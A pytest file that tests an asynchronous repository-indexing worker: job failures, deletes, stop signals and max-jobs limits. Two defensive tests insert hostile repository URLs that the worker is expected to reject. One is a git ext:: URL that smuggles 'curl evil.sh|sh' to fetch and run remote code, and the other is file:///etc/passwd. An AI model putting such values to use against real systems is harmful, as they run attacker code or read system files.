"""
Worker loop tests.

The property that matters most: one bad repository must not stop the
worker. v1 had no worker at all, so a failing ingest took down whatever
request happened to be running it.
"""

from __future__ import annotations

import asyncio

import pytest
from sqlalchemy import text

from app.indexing import queue
from app.indexing.chunker import ASTChunker
from app.indexing.worker import WorkerConfig, run_once, run_worker
from tests.test_pipeline import FakeEmbedder

REPO = "dddd0000-0000-4000-8000-000000000004"


@pytest.fixture
def chunker():
    return ASTChunker(count_tokens=lambda s: max(1, len(s.split())), min_tokens=1)


@pytest.fixture
def config(tmp_path) -> WorkerConfig:
    return WorkerConfig(workdir=tmp_path / "work", model_id="fake/test-model",
                        batch_size=8)


@pytest.fixture
async def repo_row(async_session, conn):
    with conn.cursor() as cur:
        cur.execute(
            "INSERT INTO repositories (id, name, local_path, url, status) "
            "VALUES (%s, 'w', '/tmp/w', 'https://github.com/x/y.git', 'pending')",
            (REPO,),
        )
    return REPO


async def test_run_once_on_an_empty_queue_does_nothing(async_session, config, chunker):
    assert await run_once(async_session, config, FakeEmbedder(), chunker) is False


async def test_unknown_job_kind_fails_the_job_rather_than_the_worker(
    async_session, repo_row, config, chunker
):
    await queue.enqueue(async_session, REPO, "not_a_real_kind")
    await async_session.commit()

    assert await run_once(async_session, config, FakeEmbedder(), chunker) is True
    status = (
        await async_session.execute(
            text("SELECT status, last_error FROM ingest_jobs WHERE repo_id = :i"),
            {"i": REPO},
        )
    ).one()
    assert status.status == "queued"
    assert "no handler" in status.last_error


async def test_delete_job_removes_chunks(async_session, repo_row, config, chunker, conn):
    with conn.cursor() as cur:
        cur.execute(
            """
            INSERT INTO chunks (chunk_id, repo_id, content_sha, file_path, language,
                                kind, symbol_path, start_line, end_line, token_count, content)
            VALUES ('wchunk0000000000000000', %s, 'sha', 'a.py', 'python',
                    'definition', 'a.py::f', 1, 2, 5, 'body')
            """,
            (REPO,),
        )
    await queue.enqueue(async_session, REPO, "delete")
    await async_session.commit()

    assert await run_once(async_session, config, FakeEmbedder(), chunker) is True
    left = (
        await async_session.execute(
            text("SELECT count(*) FROM chunks WHERE repo_id = :i"), {"i": REPO}
        )
    ).scalar_one()
    assert left == 0

    job = (
        await async_session.execute(
            text("SELECT status FROM ingest_jobs WHERE repo_id = :i"), {"i": REPO}
        )
    ).scalar_one()
    assert job == "done"


async def test_an_unsafe_url_fails_the_job_without_cloning(
    async_session, conn, config, chunker
):
    """An unsafe URL is not retryable: it will be unsafe next time too."""
    rid = "eeee0000-0000-4000-8000-000000000005"
    with conn.cursor() as cur:
        cur.execute(
            "INSERT INTO repositories (id, name, local_path, url, status) "
            "VALUES (%s, 'bad', '/tmp/bad', %s, 'pending')",
            (rid, "ext::sh -c 'curl evil.sh|sh'"),
        )
    await queue.enqueue(async_session, rid, "full_index")
    await async_session.commit()

    assert await run_once(async_session, config, FakeEmbedder(), chunker) is True
    err = (
        await async_session.execute(
            text("SELECT last_error FROM ingest_jobs WHERE repo_id = :i"), {"i": rid}
        )
    ).scalar_one()
    assert "not permitted" in err or "scheme" in err


async def test_a_job_for_a_deleted_repository_is_a_no_op(
    async_session, repo_row, config, chunker, conn
):
    """
    The repository can be removed while its job waits. That is not a
    failure -- the work is simply no longer wanted.
    """
    await queue.enqueue(async_session, REPO, "full_index")
    await async_session.commit()
    job = await queue.claim(async_session)

    with conn.cursor() as cur:
        cur.execute("DELETE FROM repositories WHERE id = %s", (REPO,))

    from app.indexing.worker import handle_full_index

    result = await handle_full_index(
        async_session, job, config, FakeEmbedder(), chunker
    )
    assert "skipped" in result


async def test_worker_loop_stops_when_asked(async_session, migrated, config, chunker):
    from sqlalchemy.ext.asyncio import async_sessionmaker, create_async_engine

    url = migrated.replace("postgresql+psycopg://", "postgresql+asyncpg://", 1)
    engine = create_async_engine(url)
    factory = async_sessionmaker(engine, expire_on_commit=False)
    stop = asyncio.Event()
    stop.set()
    try:
        assert await run_worker(factory, config, FakeEmbedder(), chunker, stop=stop) == 0
    finally:
        await engine.dispose()


async def test_worker_loop_respects_max_jobs(
    async_session, repo_row, migrated, config, chunker
):
    from sqlalchemy.ext.asyncio import async_sessionmaker, create_async_engine

    for _ in range(3):
        await queue.enqueue(async_session, REPO, "delete", dedupe=False)
    await async_session.commit()

    url = migrated.replace("postgresql+psycopg://", "postgresql+asyncpg://", 1)
    engine = create_async_engine(url)
    factory = async_sessionmaker(engine, expire_on_commit=False)
    try:
        processed = await run_worker(
            factory, config, FakeEmbedder(), chunker, max_jobs=2
        )
    finally:
        await engine.dispose()
    assert processed == 2


async def test_a_raising_handler_fails_the_job_and_keeps_the_worker_alive(
    async_session, repo_row, config, chunker, monkeypatch
):
    """The property v1 lacked entirely."""
    import app.indexing.worker as w

    def boom(*a, **k):
        raise RuntimeError("handler exploded")

    monkeypatch.setitem(w.HANDLERS, "delete", boom)
    await queue.enqueue(async_session, REPO, "delete")
    await async_session.commit()

    assert await run_once(async_session, config, FakeEmbedder(), chunker) is True
    row = (
        await async_session.execute(
            text("SELECT status, last_error FROM ingest_jobs WHERE repo_id = :i"),
            {"i": REPO},
        )
    ).one()
    assert row.status in {"queued", "dead"}
    assert "handler exploded" in row.last_error


async def test_an_unsafe_url_allocates_no_temp_directory(
    async_session, conn, config, chunker
):
    """
    Regression: the temp directory was created before the URL was checked,
    so a rejected URL surfaced as a filesystem error instead of the real
    reason, and allocated a directory for work that was never going to run.
    """
    rid = "ffff0000-0000-4000-8000-000000000006"
    with conn.cursor() as cur:
        cur.execute(
            "INSERT INTO repositories (id, name, local_path, url, status) "
            "VALUES (%s, 'bad2', '/tmp/bad2', %s, 'pending')",
            (rid, "file:///etc/passwd"),
        )
    await queue.enqueue(async_session, rid, "full_index")
    await async_session.commit()

    await run_once(async_session, config, FakeEmbedder(), chunker)

    err = (
        await async_session.execute(
            text("SELECT last_error FROM ingest_jobs WHERE repo_id = :i"), {"i": rid}
        )
    ).scalar_one()
    assert "not permitted" in err
    assert not config.workdir.exists() or not any(config.workdir.iterdir())
